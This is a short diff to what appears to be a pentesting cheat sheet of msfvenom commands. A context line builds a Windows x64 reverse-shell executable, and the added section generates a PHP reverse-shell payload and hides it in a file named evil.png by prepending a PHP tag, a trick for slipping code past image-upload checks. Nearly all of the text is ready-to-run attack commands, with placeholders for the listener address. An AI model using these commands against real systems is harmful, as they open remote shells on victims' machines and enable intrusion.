@@ -50,3 +50,9 @@ x64
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
+### :open_file_folder: PHP
+
+```
+msfvenom -p php/reverse_php LHOST=<local ip> LPORT=<local port> -f raw -b '"' > evil.png
+echo -e "<?php $(cat evil.png)" > evil.png 
+```
